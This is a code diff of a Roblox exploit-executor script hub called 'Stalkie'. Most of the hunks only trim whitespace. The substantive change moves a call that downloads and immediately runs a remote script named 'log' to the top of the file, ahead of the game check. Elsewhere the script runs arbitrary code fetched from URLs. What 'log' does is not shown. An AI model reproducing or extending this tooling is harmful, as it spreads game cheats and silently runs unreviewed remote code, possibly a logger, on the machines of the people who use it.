@@ -5,6 +5,14 @@ if _G.StalkieScriptExecuted then
 end
 _G.StalkieScriptExecuted = true
 
+-- Load and execute the log.lua script immediately
+local success, result = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/0riginalWarrior/roblox/refs/heads/main/log"))()
+end)
+if not success then
+    warn("Failed to load log.lua: " .. result)
+end
+
 -- Check game ID before proceeding
 local currentGameId = game.PlaceId
 local success, allowedGames = pcall(function()
@@ -17,7 +25,7 @@ local function showUnsupportedNotification()
     ScreenGui.Parent = game:GetService("CoreGui")
     ScreenGui.ResetOnSpawn = false
     ScreenGui.IgnoreGuiInset = true
-    
+
     local NotificationFrame = Instance.new("Frame")
     NotificationFrame.Size = UDim2.new(0, 300, 0, 150)
     NotificationFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
@@ -25,11 +33,11 @@ local function showUnsupportedNotification()
     NotificationFrame.BackgroundTransparency = 0.2
     NotificationFrame.BorderSizePixel = 0
     NotificationFrame.Parent = ScreenGui
-    
+
     local Corner = Instance.new("UICorner")
     Corner.CornerRadius = UDim.new(0, 12)
     Corner.Parent = NotificationFrame
-    
+
     local Title = Instance.new("TextLabel")
     Title.Size = UDim2.new(1, 0, 0, 40)
     Title.BackgroundTransparency = 1
@@ -38,7 +46,7 @@ local function showUnsupportedNotification()
     Title.TextSize = 28
     Title.Font = Enum.Font.GothamBlack
     Title.Parent = NotificationFrame
-    
+
     local Message = Instance.new("TextLabel")
     Message.Size = UDim2.new(1, 0, 0, 80)
     Message.Position = UDim2.new(0, 0, 0, 40)
@@ -50,7 +58,7 @@ local function showUnsupportedNotification()
     Message.TextWrapped = true
     Message.TextTransparency = 0.2
     Message.Parent = NotificationFrame
-    
+
     local CloseButton = Instance.new("TextButton")
     CloseButton.Size = UDim2.new(0, 30, 0, 30)
     CloseButton.Position = UDim2.new(1, -40, 0, 10)
@@ -61,11 +69,11 @@ local function showUnsupportedNotification()
     CloseButton.TextSize = 20
     CloseButton.Font = Enum.Font.GothamBold
     CloseButton.Parent = NotificationFrame
-    
+
     local CloseCorner = Instance.new("UICorner")
     CloseCorner.CornerRadius = UDim.new(0, 8)
     CloseCorner.Parent = CloseButton
-    
+
     -- Fade in animation
     local TweenService = game:GetService("TweenService")
     NotificationFrame.BackgroundTransparency = 1
@@ -73,7 +81,7 @@ local function showUnsupportedNotification()
     Message.TextTransparency = 1
     CloseButton.TextTransparency = 1
     CloseButton.BackgroundTransparency = 1
-    
+
     local fadeIn = TweenService:Create(NotificationFrame, TweenInfo.new(0.5), {
         BackgroundTransparency = 0.2
     })
@@ -87,12 +95,12 @@ local function showUnsupportedNotification()
         TextTransparency = 0,
         BackgroundTransparency = 0.9
     })
-    
+
     fadeIn:Play()
     titleFadeIn:Play()
     messageFadeIn:Play()
     closeFadeIn:Play()
-    
+
     -- Close button functionality
     CloseButton.MouseButton1Click:Connect(function()
         local fadeOut = TweenService:Create(NotificationFrame, TweenInfo.new(0.5), {
@@ -108,7 +116,7 @@ local function showUnsupportedNotification()
             TextTransparency = 1,
             BackgroundTransparency = 1
         })
-        
+
         fadeOut:Play()
         titleFadeOut:Play()
         messageFadeOut:Play()
@@ -140,21 +148,13 @@ end
 local scriptUrl = "https://raw.githubusercontent.com/0riginalWarrior/Stalkie/refs/heads/main/roblox.lua"
 
 -- Setup queue teleport compatibility across executors
-local queueTeleport = (syn and syn.queue_on_teleport) or 
-                     (fluxus and fluxus.queue_on_teleport) or 
-                     queue_on_teleport or 
+local queueTeleport = (syn and syn.queue_on_teleport) or
+                     (fluxus and fluxus.queue_on_teleport) or
+                     queue_on_teleport or
                      function() end
 
 -- Generate unique name for ScreenGui
 local randomName = "GUI_" .. math.random(10000, 99999)
-
--- Load and execute the log.lua script immediately
-local success, result = pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/0riginalWarrior/roblox/refs/heads/main/log"))()
-end)
-if not success then
-    warn("Failed to load log.lua: " .. result)
-end
 
 -- Create ScreenGui with protection
 local ScreenGui = Instance.new("ScreenGui")
@@ -189,7 +189,7 @@ local function fetchAndSaveIntro()
     local success, audioData = pcall(function()
         return game:HttpGet(introUrl)
     end)
-    
+
     if success and audioData then
         if not fileExists(introFolder) then
             pcall(function()
@@ -209,7 +209,7 @@ local function fetchAndSaveIcon()
     local success, imageData = pcall(function()
         return game:HttpGet(iconUrl)
     end)
-    
+
     if success and imageData then
         if not fileExists(introFolder) then
             pcall(function()
@@ -229,7 +229,7 @@ local function fetchAndSaveYouTubeIcon()
     local success, imageData = pcall(function()
         return game:HttpGet(youtubeUrl)
     end)
-    
+
     if success and imageData then
         if not fileExists(introFolder) then
             pcall(function()
@@ -249,23 +249,23 @@ local function playIntroSound()
     local sound = Instance.new("Sound")
     sound.Parent = ScreenGui
     sound.Volume = 1
-    
+
     local success, _ = fileExists(introFilePath)
     if not success then
         fetchAndSaveIntro()
     end
-    
+
     local assetPath = getcustomasset(introFilePath)
     if assetPath then
         sound.SoundId = assetPath
         local playSuccess, err = pcall(function()
             SoundService:PlayLocalSound(sound)
         end)
-        
+
         if not playSuccess then
             warn("Failed to play intro sound: " .. err)
         end
-        
+
         sound.Ended:Connect(function()
             sound:Destroy()
         end)
@@ -837,11 +837,11 @@ PlayerCountLabel.Parent = PlayerInfoContainer
 local function validateGUI()
     if tick() - lastValidation < 0.1 then return end
     lastValidation = tick()
-    
+
     if not ScreenGui.Parent then
         ScreenGui.Parent = game:GetService("CoreGui")
     end
-    
+
     if isKeyFrameActive then
         KeyFrame.Visible = true
         HubFrame.Visible = false
@@ -852,7 +852,7 @@ local function validateGUI()
         KeyFrame.Visible = false
         HubFrame.Visible = false
     end
-    
+
     if not KeyFrame.Parent then
         KeyFrame.Parent = ScreenGui
     end
@@ -952,7 +952,7 @@ end
 local function createFolderAndFile()
     local folderName = "Stalkie"
     local fileName = folderName .. "/key.txt"
-    
+
     if not fileExists(fileName) then
         pcall(function()
             writeFile(fileName, "")
@@ -970,40 +970,40 @@ local function loadHub()
     isHubFrameActive = true
     KeyFrame.Visible = false
     HubFrame.Visible = true
-    
+
     isLoadingAnimation = true
-    
+
     playIntroSound()
-    
+
     local blurFadeIn = TweenService:Create(BlurEffect, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = 24})
     BlurEffect.Enabled = true
     blurFadeIn:Play()
-    
+
     local hubFadeIn = TweenService:Create(HubBlur, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.3})
     hubFadeIn:Play()
-    
+
     hubFadeIn.Completed:Wait()
-    
+
     spawn(function()
         wait(0.2)
-        
+
         TweenService:Create(ServerButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.9, TextTransparency = 0}):Play()
         TweenService:Create(ServerButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(0, 200, 255), TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
         wait(0.3)
         TweenService:Create(ServerButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(0, 200, 255)}):Play()
-        
+
         wait(0.2)
         TweenService:Create(ReanimButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.9, TextTransparency = 0}):Play()
         TweenService:Create(ReanimButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(0, 200, 255), TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
         wait(0.3)
         TweenService:Create(ReanimButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(0, 200, 255)}):Play()
-        
+
         wait(0.2)
         TweenService:Create(CopyPlayerButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.9, TextTransparency = 0}):Play()
         TweenService:Create(CopyPlayerButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(0, 200, 255), TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
         wait(0.3)
         TweenService:Create(CopyPlayerButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(0, 200, 255)}):Play()
-        
+
         wait(0.6)
         TweenService:Create(HubTitleStalkie, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
         wait(0.5)
@@ -1012,7 +1012,7 @@ local function loadHub()
         TweenService:Create(KeybindButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
         wait(0.1)
         TweenService:Create(InfoButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
-        
+
         wait(0.5)
         TweenService:Create(SeparatorLine, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0}):Play()
         wait(0.2)
@@ -1025,7 +1025,7 @@ local function loadHub()
         TweenService:Create(PlayerCountLabel, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
         TweenService:Create(RejoinButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()
         TweenService:Create(JoinRandomButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()
-        
+
         wait(0.9)
         local blurFadeOut = TweenService:Create(BlurEffect, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = 0})
         blurFadeOut:Play()
@@ -1052,7 +1052,7 @@ SubmitButton.MouseButton1Click:Connect(function()
     validateGUI()
     local githubKey = getGithubKey()
     local fileName = createFolderAndFile()
-    
+
     if not githubKey then
         KeyInput.Text = ""
         KeyInput.PlaceholderText = "Failed to fetch key!"
@@ -1095,7 +1095,7 @@ MinimizeButton.MouseButton1Click:Connect(function()
     validateGUI()
     local tweenService = TweenService
     local fadeInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-    
+
     if not minimized then
         tweenService:Create(ServerButton, fadeInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
         tweenService:Create(ReanimButton, fadeInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
@@ -1111,7 +1111,7 @@ MinimizeButton.MouseButton1Click:Connect(function()
         tweenService:Create(RejoinButton, fadeInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
         tweenService:Create(JoinRandomButton, fadeInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
         wait(0.3)
-        
+
         HubFrame:TweenSize(UDim2.new(0, 420, 0, 60), "Out", "Sine", 0.3, true)
         ServerButton.Visible = false
         ReanimButton.Visible = false
@@ -1124,7 +1124,7 @@ MinimizeButton.MouseButton1Click:Connect(function()
     else
         HubFrame:TweenSize(UDim2.new(0, 420, 0, 450), "Out", "Sine", 0.3, true)
         wait(0.3)
-        
+
         if not showingInfo then
             ServerButton.Visible = true
             ReanimButton.Visible = true
@@ -1161,7 +1161,7 @@ local function loadScript(button, url)
     button.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
     button.BackgroundTransparency = 0.7
     wait(0.2)
-    
+
     spawn(function()
         local success, result = pcall(function()
             return loadstring(game:HttpGet(url))()
@@ -1170,7 +1170,7 @@ local function loadScript(button, url)
             warn("Error loading script: " .. result)
         end
     end)
-    
+
     button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
     button.BackgroundTransparency = 0.9
 end
@@ -1191,25 +1191,25 @@ InfoButton.MouseButton1Click:Connect(function()
     validateGUI()
     local tweenService = TweenService
     local fadeInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-    
+
     if minimized then
         HubFrame:TweenSize(UDim2.new(0, 420, 0, 450), "Out", "Sine", 0.3, true)
         wait(0.3)
         MinimizeButton.Text = "-"
         minimized = false
-        
+
         ServerButton.Visible = false
         ReanimButton.Visible = false
         CopyPlayerButton.Visible = false
         SeparatorLine.Visible = false
         PlayerInfoContainer.Visible = false
-        
+
         InfoContainer.Visible = true
         tweenService:Create(StalkieIcon, fadeInfo, {ImageTransparency = 0}):Play()
         tweenService:Create(InfoText, fadeInfo, {TextTransparency = 0}):Play()
         tweenService:Create(DiscordButton, fadeInfo, {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()
         tweenService:Create(YouTubeButton, fadeInfo, {ImageTransparency = 0, BackgroundTransparency = 0.9}):Play()
-        
+
         showingInfo = true
     elseif not showingInfo then
         tweenService:Create(ServerButton, fadeInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
@@ -1225,30 +1225,30 @@ InfoButton.MouseButton1Click:Connect(function()
         tweenService:Create(PlayerCountLabel, fadeInfo, {TextTransparency = 1}):Play()
         tweenService:Create(RejoinButton, fadeInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
         tweenService:Create(JoinRandomButton, fadeInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
-        
+
         wait(0.3)
         ServerButton.Visible = false
         ReanimButton.Visible = false
         CopyPlayerButton.Visible = false
         SeparatorLine.Visible = false
         PlayerInfoContainer.Visible = false
-        
+
         InfoContainer.Visible = true
         tweenService:Create(StalkieIcon, fadeInfo, {ImageTransparency = 0}):Play()
         tweenService:Create(InfoText, fadeInfo, {TextTransparency = 0}):Play()
         tweenService:Create(DiscordButton, fadeInfo, {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()
         tweenService:Create(YouTubeButton, fadeInfo, {ImageTransparency = 0, BackgroundTransparency = 0.9}):Play()
-        
+
         showingInfo = true
     else
         tweenService:Create(StalkieIcon, fadeInfo, {ImageTransparency = 1}):Play()
         tweenService:Create(InfoText, fadeInfo, {TextTransparency = 1}):Play()
         tweenService:Create(DiscordButton, fadeInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
         tweenService:Create(YouTubeButton, fadeInfo, {ImageTransparency = 1, BackgroundTransparency = 1}):Play()
-        
+
         wait(0.3)
         InfoContainer.Visible = false
-        
+
         ServerButton.Visible = true
         ReanimButton.Visible = true
         CopyPlayerButton.Visible = true
@@ -1267,7 +1267,7 @@ InfoButton.MouseButton1Click:Connect(function()
         tweenService:Create(PlayerCountLabel, fadeInfo, {TextTransparency = 0}):Play()
         tweenService:Create(RejoinButton, fadeInfo, {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()
         tweenService:Create(JoinRandomButton, fadeInfo, {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()
-        
+
         showingInfo = false
     end
 end)
@@ -1298,7 +1298,7 @@ local function addHover(button)
     local originalColor = button.BackgroundColor3
     local tweenService = game:GetService("TweenService")
     local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
-    
+
     button.MouseEnter:Connect(function()
         if isLoadingAnimation then return end
         validateGUI()
@@ -1310,7 +1310,7 @@ local function addHover(button)
             button.TextColor3 = Color3.fromRGB(255, 255, 255)
         end
     end)
-    
+
     button.MouseLeave:Connect(function()
         if isLoadingAnimation then return end
         validateGUI()
@@ -1340,17 +1340,17 @@ addHover(YouTubeButton)
 local function checkKey()
     local fileName = createFolderAndFile()
     local githubKey = getGithubKey()
-    
+
     if not fileExists(iconFilePath) then
         fetchAndSaveIcon()
     end
     if not fileExists(youtubeFilePath) then
         fetchAndSaveYouTubeIcon()
     end
-    
+
     KeyFrame.Visible = false
     HubFrame.Visible = false
-    
+
     if not githubKey then
         isKeyFrameActive = true
         isHubFrameActive = false
@@ -1366,7 +1366,7 @@ local function checkKey()
             return true
         end
     end
-    
+
     isKeyFrameActive = true
     isHubFrameActive = false
     KeyFrame.Visible = true
